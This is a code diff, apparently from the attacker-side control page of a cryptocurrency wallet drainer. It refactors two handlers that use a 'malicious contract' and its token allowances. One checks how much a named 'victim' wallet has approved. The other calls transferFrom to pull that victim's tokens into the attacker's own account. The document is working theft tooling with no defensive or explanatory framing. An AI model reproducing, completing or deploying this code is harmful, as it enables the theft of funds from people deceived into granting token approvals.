@@ -126,45 +126,37 @@ async function connectAttackerWallet() {
         alert("Please install MetaMask!");
     }
 }
- 
 
+// Check Allowance
+document.getElementById("checkAllowanceBtn").addEventListener("click", async () => {
+    const victimAddress = prompt("Enter victim's wallet address:");
+    if (victimAddress) {
+        try {
+            const allowance = await contract.methods.allowance(victimAddress, maliciousContractAddress).call();
+            if (allowance > 0) {
+                alert(`Allowance: ${allowance} tokens granted.`);
+            } else {
+                alert("No allowance granted.");
+            }
+        } catch (error) {
+            alert("Error while checking allowance.");
+            console.error(error);
+        }
+    }
+});
 
-            // Check Allowance
-            document.getElementById("checkAllowanceBtn").addEventListener("click", async () => {
-                const victimAddress = prompt("Enter victim's wallet address:");
-                if (victimAddress) {
-                    try {
-                        const allowance = await maliciousContract.methods.allowance(victimAddress, maliciousContractAddress).call();
-                        if (allowance > 0) {
-                            alert(`Allowance: ${allowance} tokens granted.`);
-                        } else {
-                            alert("No allowance granted.");
-                        }
-                    } catch (error) {
-                        alert("Error while checking allowance.");
-                        console.error(error);
-                    }
-                }
-  
-
-            // Withdraw Tokens
-            document.getElementById("transferTokensBtn").addEventListener("click", async () => {
-                const victimAddress = prompt("Enter victim's wallet address:");
-                const amount = prompt("Enter the amount to withdraw:");
-                if (victimAddress && amount) {
-                    try {
-                        await maliciousContract.methods.transferFrom(victimAddress, accounts[0], amount).send({ from: accounts[0] });
-                        alert(`${amount} tokens withdrawn.`);
-                    } catch (error) {
-                        alert("Error during withdrawal.");
-                        console.error(error);
-                    }
-                }
-            });
-        </script>
-    </div>
-</body>
-</html>
-
-
-
+// Withdraw Tokens
+document.getElementById("transferTokensBtn").addEventListener("click", async () => {
+    const victimAddress = prompt("Enter victim's wallet address:");
+    const amount = prompt("Enter the amount to withdraw:");
+    if (victimAddress && amount) {
+        try {
+            await contract.methods.transferFrom(victimAddress, accounts[0], amount).send({ from: accounts[0] });
+            alert(`${amount} tokens withdrawn.`);
+        } catch (error) {
+            alert("Error during withdrawal.");
+            console.error(error);
+        }
+    }
+});
+</script>
